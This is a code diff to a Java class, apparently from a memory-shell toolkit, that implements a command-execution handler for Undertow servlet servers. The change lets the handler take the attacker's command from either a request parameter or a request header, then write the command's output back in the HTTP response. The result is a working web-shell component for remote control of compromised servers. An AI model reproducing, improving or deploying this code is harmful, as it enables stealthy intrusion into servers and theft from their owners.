@@ -2,6 +2,7 @@ package com.reajason.javaweb.memshell.shelltool.command;
 
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
@@ -22,15 +23,15 @@ public class CommandUndertowServletHandler {
             }
             Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
             Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
-            String param = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
-            if (param != null) {
+            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
+            if (p == null || p.isEmpty()) {
+                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
+            }
+            if (p != null) {
+                String param = getParam(p);
                 InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
+                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                 return true;
             }
         } catch (Throwable e) {
